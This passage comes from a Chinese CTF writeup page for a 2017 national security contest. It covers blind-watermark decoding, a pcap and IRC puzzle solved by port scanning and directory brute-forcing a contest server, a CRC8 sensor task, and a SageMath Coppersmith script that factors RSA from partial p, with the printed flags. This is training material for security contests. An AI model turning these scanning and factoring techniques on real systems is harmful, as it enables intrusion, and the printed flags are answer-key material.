<p>&#x731C;&#x6D4B;&#x662F;&#x76F2;&#x6C34;&#x5370;<br>&#x5DE5;&#x5177;&#xFF1A;<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank">https://github.com/chishaxie/BlindWaterMark</a>  </p>
<p><code>python27 bwm.py decode fuli.png fuli2.png res.png</code>  </p>
<p>     <a href="http://p0.qhimg.com/t013c7a81d2f3b662ee.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t013c7a81d2f3b662ee.png" alt="">
     </a></p>
<h3 id="12badhacker"><a name="12badhacker" class="anchor-navigation-ex-anchor" href="#12badhacker"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.3. 12.badhacker</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;MISC    &#x5206;&#x503C;&#xFF1A;200&#x5206;</p>
<p>&#x9996;&#x5148;&#x770B;&#x5230;pcap&#x4E2D;IRC&#x4EA4;&#x6D41;</p>
<p>     <a href="http://p9.qhimg.com/t012a573bef466d4117.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p9.qhimg.com/t012a573bef466d4117.png" alt="">
     </a></p>
<p>     <a href="http://p0.qhimg.com/t012b282728f0b84d48.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p0.qhimg.com/t012b282728f0b84d48.png" alt="">
     </a></p>
<p>&#x610F;&#x601D;&#x5C31;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x627E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x627E;&#x6539;&#x52A8;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x628A;&#x884C;&#x53F7;&#x6392;&#x5E8F;&#x8BA1;&#x7B97;md5</p>
<p>This server &#x5C31;&#x662F;irc&#x670D;&#x52A1;&#x5668;</p>
<p>     <a href="http://p9.qhimg.com/t019a9b5409f521d44e.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p9.qhimg.com/t019a9b5409f521d44e.png" alt="">
     </a></p>
<p>&#x626B;&#x63CF;&#x7AEF;&#x53E3;</p>
<p>&#x53D1;&#x73B0;</p>
<p><code>http://202.5.20.47:8923</code></p>
<p>&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x662F;&#x5F00;&#x7684;</p>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x8111;&#x6D1E;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x652F;&#x6301;host&#x4E3A;ip&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x53EA;&#x80FD;&#x8BB2;host&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x7684;&#xFF0C;&#x5982;&#x63D0;&#x793A;&#x7684;misc.ichunqiu.com</p>
<p>&#x6240;&#x4EE5;&#xFF0C;&#x5728;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;Host&#x8868;&#x4E2D;&#x6DFB;&#x52A0;DNS&#xFF0C;&#x5C06;misc.ichunqiu.com&#x89E3;&#x6790;&#x6210;<code>http://202.5.20.47:8923/</code></p>
<p>&#x7136;&#x540E;&#x5BF9;&#x8FD9;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x76EE;&#x5F55;&#x7206;&#x7834;&#xFF0C;&#x7206;&#x51FA;mysql.bak</p>
<p>     <a href="http://p2.qhimg.com/t01f3e9a8738d8825f0.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p2.qhimg.com/t01f3e9a8738d8825f0.png" alt="">
     </a></p>
<p>&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6709;&#x70B9;&#x610F;&#x601D;&#xFF0C;&#x9700;&#x8981;&#x627E;&#x6539;&#x52A8;&#x7684;&#x5730;&#x65B9;&#x3002;&#x8111;&#x6D1E;&#x5C31;&#x662F;&#x5728;unix&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6362;&#x884C;&#x662F;n&#xFF0C;&#x800C;&#x5728;windows&#x4E2D;&#x7684;&#x6362;&#x884C;&#x662F;rn&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x627E;&#x6539;&#x52A8;&#x7684;&#x5730;&#x65B9;&#x3002;&#x627E;&#x5230;3&#x5904;&#xFF0C;&#x4EA4;&#x4E86;&#x4E0D;&#x5BF9;&#x3002;</p>
<p>&#x4E8E;&#x662F;&#x6269;&#x5927;&#x641C;&#x7D22;&#x8303;&#x56F4;&#xFF0C;&#x641C;&#x7D22;r&#xFF0C;&#x53D1;&#x73B0;&#x6709;8&#x5904;</p>
<p>     <a href="http://p5.qhimg.com/t01cec2024b2b561c23.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p5.qhimg.com/t01cec2024b2b561c23.png" alt="">
     </a></p>
<p>&#x5C06;&#x5176;&#x884C;&#x53F7;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x8BA1;&#x7B97;md5&#x5373;&#x53EF;&#x3002;</p>
<p>&#x4E24;&#x4E2A;&#x8111;&#x6D1E;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x670D;&#x52A1;&#x5668;&#x62D2;&#x7EDD;host&#x4E3A;IP&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F;unix&#x548C;windows&#x6362;&#x884C;&#x7B26;&#x53F7;&#x3002;</p>
<p>     <a href="http://p4.qhimg.com/t01e53d49dbd24187dc.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p4.qhimg.com/t01e53d49dbd24187dc.png" alt="">
     </a></p>
<h3 id="13&#x4F20;&#x611F;&#x5668;2"><a name="13&#x4F20;&#x611F;&#x5668;2" class="anchor-navigation-ex-anchor" href="#13&#x4F20;&#x611F;&#x5668;2"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.4. 13.&#x4F20;&#x611F;&#x5668;2</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;MISC    &#x5206;&#x503C;&#xFF1A;250&#x5206;</p>
<p>&#x5BF9;#0X02 4D        88 45 AB F3   41 19</p>
<p>&#x9664;&#x4E86;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#x662F;&#x6821;&#x9A8C;&#x4F4D;&#xFF0C;&#x5176;&#x4ED6;&#x90FD;&#x662F;&#x63A7;&#x5236;&#x547D;&#x4EE4;&#x548C;ID&#x53F7;&#xFF0C;&#x76F4;&#x63A5;CRC8&#x5C31;&#x53EF;&#x4EE5;</p>
<p>&#x66F4;&#x6539;88 45 AB F3&#x4E3A;</p>
<p>     <a href="http://p5.qhimg.com/t0194128ccc93fbd01b.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p5.qhimg.com/t0194128ccc93fbd01b.png" alt="">
     </a></p>
<p>&#x518D;&#x8BA1;&#x7B97;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
<p>     <a href="http://p6.qhimg.com/t015d167382bebc8e58.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p6.qhimg.com/t015d167382bebc8e58.png" alt="">
     </a></p>
<p>&#x4E0A;&#x56FE;&#x662F;ID&#x4E3A;88 45 AB F3&#x7684;</p>
<h3 id="15embarrass"><a name="15embarrass" class="anchor-navigation-ex-anchor" href="#15embarrass"><i class="fa fa-link" aria-hidden="true"></i></a>5.4.5. 15.embarrass</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;MISC   &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
<p>     <a href="http://p1.qhimg.com/t017bcc0c9cb9fe14e8.jpg" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://p1.qhimg.com/t017bcc0c9cb9fe14e8.jpg" alt="">
     </a></p>
<h2 id="&#x56DB;&#x3001;crypto"><a name="&#x56DB;&#x3001;crypto" class="anchor-navigation-ex-anchor" href="#&#x56DB;&#x3001;crypto"><i class="fa fa-link" aria-hidden="true"></i></a>5.5. &#x56DB;&#x3001;Crypto</h2>
<h3 id="11partial"><a name="11partial" class="anchor-navigation-ex-anchor" href="#11partial"><i class="fa fa-link" aria-hidden="true"></i></a>5.5.1. 11.partial</h3>
<p>&#x7C7B;&#x578B;&#xFF1A;Crypto    &#x5206;&#x503C;&#xFF1A;300&#x5206;</p>
<p>Coppersmith Attack &#x5DF2;&#x77E5;&#x90E8;&#x5206;p&#xFF0C;&#x5176;&#x5B9E;&#x7ED9;&#x7684;&#x6709;&#x70B9;&#x591A;&#xFF0C;&#x7ED9;576bit&#x7684;&#x5C31;&#x8DB3;&#x591F;&#x4E86;</p>
<pre class="language-"><code>n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9
p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000
p_fake = p+0x10000000000000000000000000
pbits = 1024
kbits = pbits-576
pbar = p_fake &amp; (2^pbits-2^kbits)
print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)
PR.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span> = PolynomialRing(Zmod(n))
f = x + pbar
x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4
print x0 + pbar
flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng}
</code></pre><script src="_gitbook_plugin_analytics.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="2019ddctf.html" class="navigation navigation-prev " aria-label="Previous page: 2019DDCTF">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="xihulunjian2019.html" class="navigation navigation-next " aria-label="Next page: 2019西湖论剑预选赛">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"2017全国信安赛","level":"1.5.3","depth":2,"next":{"title":"2019西湖论剑预选赛","level":"1.5.4","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},"previous":{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus","anchor-navigation-ex","fancybox"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"fancybox":{"helpers":{"buttons":{}}},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2017national.md","mtime":"2019-04-23T06:39:23.848Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-24T08:48:49.502Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.mousewheel.pack.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.pack.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fancybox/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

